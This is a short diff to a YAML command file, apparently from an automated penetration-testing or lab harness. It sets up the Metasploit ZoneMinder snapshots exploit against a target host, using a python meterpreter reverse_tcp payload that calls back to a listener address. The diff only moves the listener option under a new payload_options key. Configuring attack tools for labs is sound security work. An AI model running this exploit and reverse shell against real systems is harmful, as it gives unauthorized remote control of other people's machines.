@@ -23,5 +23,6 @@ commands:
     cmd: exploit/unix/webapp/zoneminder_snapshots
     options:
       RHOSTS: 192.42.0.254
+    payload_options:
       LHOST: 192.42.2.253
     payload: cmd/unix/python/meterpreter/reverse_tcp
